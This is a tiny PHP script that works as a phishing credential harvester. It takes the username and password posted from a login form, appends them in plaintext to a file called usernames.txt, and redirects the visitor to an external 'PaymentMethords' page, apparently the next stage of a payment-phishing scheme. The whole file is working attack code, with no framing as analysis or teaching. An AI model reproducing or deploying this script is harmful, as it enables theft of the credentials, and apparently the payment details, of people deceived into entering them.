<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: http://yoco.orgfree.com/Pages/PaymentMethords.html');
exit();
